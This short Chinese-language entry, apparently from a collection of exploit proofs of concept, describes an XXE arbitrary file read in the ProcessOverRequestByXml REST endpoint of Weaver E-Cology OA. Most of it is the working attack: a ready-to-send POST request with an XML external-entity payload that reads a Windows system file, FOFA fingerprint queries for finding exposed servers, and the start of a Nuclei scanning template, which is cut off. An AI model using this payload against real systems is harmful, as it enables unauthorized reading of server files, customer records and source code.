# 泛微E-Cology-ProcessOverRequestByXml接口处存在任意文件读取漏洞

- **系统**：泛微OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/js/ecology8"`
- **请求**：`POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Type: application/xml`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
```

**其他**
- Nuclei: | id: FW-E-Cology-ProcessOverRequestByXmlt-Read         info:     name: 泛微E-Cology-ProcessOverRequestByXmlt接口处存在任意文件读取，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。     author: Htwo     severity: high     metadata:        fofa-query: body="/js/ecology8" ｜  body="wui/common/css/w7OVFont_wev8.css" ｜  (body="weaver" && body="ecology") ｜  (header="ecology_JSessionId" && body="login/Login.jsp") ｜  bo